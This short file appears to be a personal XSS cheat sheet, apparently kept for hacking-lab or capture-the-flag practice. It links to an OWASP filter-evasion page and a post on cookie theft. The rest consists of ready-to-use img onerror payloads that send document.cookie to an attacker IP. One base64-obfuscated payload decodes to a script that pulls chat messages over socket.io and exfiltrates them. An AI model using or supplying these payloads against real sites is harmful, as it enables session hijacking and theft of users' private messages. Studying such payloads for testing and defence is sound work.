https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#xss-locator-polyglot

https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e

```html
<img src=x onerror=this.src="http://10.10.14.122/"+btoa(document.cookie)>

<img src=x onerror=fetch('http://10.10.14.122/?c='+document.cookie);>

<img src=x onerror=fetch('http://10.10.14.122/'+document.cookie);>

<img SRC=x onerror='eval(atob("Y29uc3Qgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CnNjcmlwdC5zcmMgPSAnL3NvY2tldC5pby9zb2NrZXQuaW8uanMnOwpkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7CnNjcmlwdC5hZGRFdmVudExpc3RlbmVyKCdsb2FkJywgZnVuY3Rpb24oKSB7CmNvbnN0IHJlcyA9IGF4aW9zLmdldChgL3VzZXIvYXBpL2NoYXRgKTsgY29uc3Qgc29ja2V0ID0gaW8oJy8nLHt3aXRoQ3JlZGVudGlhbHM6IHRydWV9KTsgc29ja2V0Lm9uKCdtZXNzYWdlJywgKG15X21lc3NhZ2UpID0+IHtmZXRjaCgiaHR0cDovLzEwLjEwLjE0LjIxMi8/ZD0iICsgYnRvYShteV9tZXNzYWdlKSl9KSA7IHNvY2tldC5lbWl0KCdjbGllbnRfbWVzc2FnZScsICdoaXN0b3J5Jyk7Cn0pOw=="));' />
```